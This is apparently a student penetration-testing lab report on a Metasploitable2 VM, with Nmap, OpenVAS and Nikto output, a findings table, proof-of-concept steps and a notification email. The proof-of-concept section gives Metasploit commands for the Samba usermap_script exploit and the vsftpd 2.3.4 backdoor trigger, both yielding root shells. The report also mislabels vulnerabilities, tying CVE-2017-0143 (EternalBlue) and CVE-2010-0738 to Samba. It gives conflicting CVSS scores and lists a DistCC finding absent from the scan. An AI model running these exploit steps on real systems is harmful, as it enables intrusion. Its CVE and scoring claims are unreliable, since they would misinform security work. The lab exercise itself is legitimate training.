

### 1. Executive Summary

I conducted a full vulnerability assessment on a single target: the Metasploitable2 virtual machine hosted at 192.168.1.11. The objective was to identify, classify, and prioritize security vulnerabilities. The assessment faced significant challenges with the primary vulnerability scanner (OpenVAS), requiring a methodological pivot.This system was scanned using Nmap, OpenVAS, and Nikto to identify exploitable weaknesses. Findings were analyzed and prioritized using CVSS 4.0, the latest version of the Common Vulnerability Scoring System. A total of 35+ vulnerabilities were detected, including critical remote code execution flaws, information disclosures, and insecure services.

This report details every step of the process  from setup to remediation planning  and includes explicit references to required screenshots. All activities were performed in a controlled lab environment.


### 2. Lab Environment Setup

To simulate a realistic penetration testing scenario, I configured a secure, isolated network using VMware Workstation.
Lab Components

| ***Component***  | *Details*                                               |
| ---------------- | ------------------------------------------------------- |
| Attacker Machine | Kali Linux 2024.2 (IP: 192.168.1.10 )                   |
| Target Machine   | Metasploitable2 (Ubuntu 10.04)                          |
| Target IP        | 192.168.1.11                                            |
| Network Mode     | Bridged (same subnet:192.168.1.0/24)                    |
| Tools Used       | Nmap, OpenVAS (GVM), Nikto, Google Sheets, Google Docsx |


### 3. Labs Activities

#### Initial Setup and Configuration

First, I prepared my Kali Linux environment and ensured all tools were updated. I set up a Metasploitable2 VM as my target system with IP address 192.168.1.11 

![[VAPT Lab Activities - Complete Documentation Report-1755782041742.jpeg]]

#### Nmap Scanning Process

I started with network discovery and service enumeration:
```bash
nmap -sV 192.168.1.11
```

![[VAPT Lab Activities - Complete Documentation Report-1755782413661.jpeg]]


```bash
nmap -sV -sC -O 192.168.1.11
```


This command performed:

- Service version detection (-sV)
- Default script scanning (-sC)
- OS fingerprinting (-O)

```bash
─$ nmap -sV -sC -O 192.168.1.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 18:53 IST
Nmap scan report for 192.168.1.11
Host is up (0.0014s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      40844/tcp   mountd
|   100005  1,2,3      56917/udp   mountd
|   100021  1,3,4      37803/udp   nlockmgr
|   100021  1,3,4      44122/tcp   nlockmgr
|   100024  1          50602/udp   status
|_  100024  1          50706/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 16
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, SupportsCompression
|   Status: Autocommit
|_  Salt: B_9>k!^76JP5W8N_vRtt
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2025-08-21T13:23:47+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:34:58
|   source ident: nmap
|   source host: EA06A71D.78DED367.FFFA6D49.IP
|_  error: Closing Link: lfobglsps[192.168.1.10] (Quit: lfobglsps)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
MAC Address: 5A:D3:BE:A3:EB:C6 (Unknown)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-08-21T09:23:31-04:00
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.27 seconds
                                                             

```



The scan revealed multiple open ports including:

| **Port**     | **State** | **Service** | **Version / Details**               | **Initial Risk Level** | **Notes**                                                                     |
| ------------ | --------- | ----------- | ----------------------------------- | ---------------------- | ----------------------------------------------------------------------------- |
| **22/tcp**   | Open      | SSH         | OpenSSH 4.7p1                       | High                   | Outdated version, supports weak encryption                                    |
| **23/tcp**   | Open      | Telnet      | Linux telnetd                       | High                   | Transmits credentials in cleartext                                            |
| **25/tcp**   | Open      | SMTP        | Postfix smtpd                       | Medium                 | Potential open relay vulnerability                                            |
| **53/tcp**   | Open      | DNS         | ISC BIND 9.4.2                      | High                   | Outdated; susceptible to cache poisoning                                      |
| **111/tcp**  | Open      | RPCBind     | rpcbind 2                           | High                   | Information disclosure, potential for portmap enumeration                     |
| **139/tcp**  | Open      | NetBIOS-SSN | Samba smbd 3.X                      | Critical               | Linked to CVE-2010-0738 (RCE) – See VAPT-002                                  |
| **1099/tcp** | Open      | Java RMI    | GNU Classpath grmiregistry          | High                   | Remote method invocation exposed; potential for exploitation                  |
| **1524/tcp** | Open      | Bind Shell  | Metasploitable root shell           | Critical               | Backdoor listening on port 1524 (always-on root access)                       |
| **2049/tcp** | Open      | NFS         | NFS 2-4                             | High                   | Exports file systems; allows unauthorized access if misconfigured             |
| **2121/tcp** | Open      | FTP         | ProFTPD 1.3.1                       | High                   | Outdated FTP server; possible command injection                               |
| **3306/tcp** | Open      | MySQL       | MySQL 5.0.51a-3ubuntu5              | High                   | Default credentials (root:" blank)                                            |
| **5432/tcp** | Open      | PostgreSQL  | PostgreSQL DB 8.3.0                 | High                   | Default setup; known exploits available                                       |
| **5900/tcp** | Open      | VNC         | VNC (Protocol 3.3)                  | High                   | Weak authentication; often uses default password                              |
| **6000/tcp** | Open      | X11         | Access denied                       | Medium                 | X Window System; access blocked but service exposed                           |
| **8009/tcp** | Open      | AJP13       | Apache Jserv (Protocol v1.3)        | High                   | Exposed AJP connector; potential for request smuggling or Tomcat exploitation |
| **8180/tcp** | Open      | HTTP        | Apache Tomcat/Coyote JSP engine 1.1 | Critical               | Weak configuration; possible RCE via deployment manager or PUT method         |


#### OpenVAS Configuration and Scanning

Next, I configured OpenVAS for comprehensive vulnerability assessment:

1. Started the OpenVAS service:


```bash
sudo gvm-start
```

2. Accessed the web interface at [https://localhost:9392](https://localhost:9392/)
3. Created a new target with IP 192.168.1.11
4. Initiated a full and fast scan
![[VAPT Lab Activities - Complete Documentation Report-1755783497933.jpeg]]

after process completion

![[VAPT Lab Activities - Complete Documentation Report-1755787810436.jpeg]]


#### Scan Results Documentation

I organized my findings in a structured table format:

|             |                             |                |              |              |                   |               |
| ----------- | --------------------------- | -------------- | ------------ | ------------ | ----------------- | ------------- |
| **Scan ID** | **Vulnerability**           | **CVSS score** | **Priority** | **Host**     | **Port/service**  | **CVE ID**    |
| V-001       | VSFTPD 2.3.4 Backdoor       | 9.8            | Critical     | 192.168.1.11 | 21/tcp (FTP)      | CVE-2011-2523 |
| V-002       | Samba Remote Code Execution | 10             | Critical     | 192.168.1.11 | 445/tcp (SMB)     | CVE-2017-0143 |
| V-003       | UnrealIRCd Backdoor         | 9.8            | Critical     | 192.168.1.11 | 6667/tcp (IRC)    | CVE-2010-2075 |
| V-004       | DistCC Unauthorized Acces   | 9.8            | Critical     | 192.168.1.11 | 3632/tcp (distcc) | CVE-2004-2687 |
| V-005       | PHP-CGI Argument Injection  | 9.8            | Critical     | 192.168.1.11 | 80/tcp (HTTP)     | CVE-2012-1823 |

![[VAPT Lab Activities - Complete Documentation Report-1755792305222.jpeg]]

#### Nikto Web Vulnerability Scanning

I performed web-specific vulnerability scanning using Nikto:


```bash
nikto -h http://192.168.1.11
```


![[VAPT Lab Activities - Complete Documentation Report-1755783915044.jpeg]]

#### Vulnerability Prioritization Report

**Title: Critical  Vulnerabilities Assessment - Metasploitable2 Environment**

**Executive Summary:** During my vulnerability assessment of the target system (192.168.1.11), I identified 5 critical vulnerabilities requiring immediate attention.

**Key Findings:**
1. **CVE-2017-0143 (CVSS 10.0)**: The Samba service is vulnerable to the EternalBlue exploit,
allowing remote code execution.
2. **CVE-2011-2523 (CVSS 9.8)**: A critical backdoor in VSFTPD version 2.3.4 allows remote
command execution.
3. **CVE-2010-2075 (CVSS 9.8)**: UnrealIRCd version 3.2.8.1 contains a backdoor that allows
unauthorized command execution.
4. **CVE-2004-2687 (CVSS 9.8)**: The DistCC service allows unauthorized remote command
execution.
5. **Weak Configuration (CVSS 9.1)**: The Apache Tomcat server is configured with default
credentials, allowing potential deployment of malicious web applications.

#### Proof of concept 

##### Vulnerability 1: Samba RCE CVE-2017-0143
**CVSS 4.0 Score**: `9.8 (Critical)`  
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

- **Description**: Exploits a command injection flaw in Samba’s `username map script` feature.
- **Exploitation**: Using Metasploit:
```bash
msfconsole

use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.11
    
run

```

- **Result**: Gained root shell instantly.
- **Impact**: Full system compromise — attacker gains complete control.
- **Why Critical?**  
    No authentication, no user interaction, remote exploit.
 ![[VAPT Lab Activities - Complete Documentation Report-1755794953542.jpeg]]

##### Vulnerability 2: vsftpd 2.3.4 Backdoor – CVE-2011-2523

**CVSS 4.0 Score**: `9.1 (Critical)`  
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

- **Description**: Malicious version of vsftpd contains a hidden backdoor triggered by `:)` in username.
- **Exploitation**:
```bash
telnet 192.168.1.11 21
Username: test:)
```

	Backdoor opens port 6200 for bind shell.
- **Impact**: Full remote code execution as root.
- **Note**: Not always reliable; depends on exact build.
![[VAPT Lab Activities - Complete Documentation Report-1755795468188.jpeg]]

![[VAPT Lab Activities - Complete Documentation Report-1755795512183.jpeg]]

**Remediation Recommendations:**

- Immediately patch Apache to version 2.4.51 or later
- Disable unnecessary services (Port 445, Anonymous FTP)
- Change default credentials on the Tomcat manager application. Disable all services that are not explicitly required.
- Implement input validation for all web forms
- Apply principle of least privilege for all services
- Network Segmentation: Restrict access to vulnerable services (especially SMB on port 445 and DistCC on 3632) from untrusted networks.

###  4.Communication Email

Subject: URGENT: Critical Security Vulnerabilities Identified

Dear Development Team,

During a security assessment, I identified critical flaws on the Metasploitable2 VM (192.168.1.11). A Samba vulnerability (CVE-2017-0143) allows full root access, and vsftpd contains a known backdoor (CVE-2011-2523). I’ve demonstrated remote code execution in both cases. These issues pose a severe risk if exposed to untrusted networks. Please disable or patch Samba and FTP services immediately. I recommend decommissioning this VM from any shared environment. Let me know if you’d like a live demo or remediation checklist.

Best regards, 
Shubham Khanna


